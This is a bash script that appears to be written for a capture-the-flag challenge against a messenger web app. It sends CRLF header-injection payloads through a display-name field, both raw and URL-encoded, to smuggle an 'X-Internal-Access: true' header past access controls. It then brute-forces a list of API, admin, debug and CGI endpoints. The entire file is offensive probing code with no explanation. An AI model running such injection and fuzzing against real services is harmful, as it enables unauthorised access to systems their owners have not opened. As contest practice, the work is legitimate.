#!/bin/bash
BASE="http://millenium-messenger.hackday.fr:8000"

echo "=== CRLF header injection test ==="
# Try CRLF injection in display name to inject X-Internal-Access header
curl -s -i -X POST "$BASE/api/set_displayname" \
  -H "Content-Type: application/json" \
  -d '{"name":"test\r\nX-Internal-Access: true"}'
echo ""

echo "=== URL encoded CRLF ==="
curl -s -i -X POST "$BASE/api/set_displayname" \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"test%0d%0aX-Internal-Access:%20true\"}"
echo ""

# Enumerate possible endpoints
echo "=== Fuzz endpoints ==="
for ep in archives admin diagnostic diag cgi tool status debug epoch key capture traffic pcap history messages logs; do
  resp=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/$ep")
  echo "/$ep -> $resp"
  resp=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/api/$ep")
  echo "/api/$ep -> $resp"
done
echo ""

echo "=== Try CGI endpoints ==="
for ep in ping diag diagnostic status check msn msnp info; do
  resp=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/cgi-bin/$ep")
  echo "/cgi-bin/$ep -> $resp"
  resp=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/cgi-bin/$ep.cgi")
  echo "/cgi-bin/$ep.cgi -> $resp"
done
echo ""
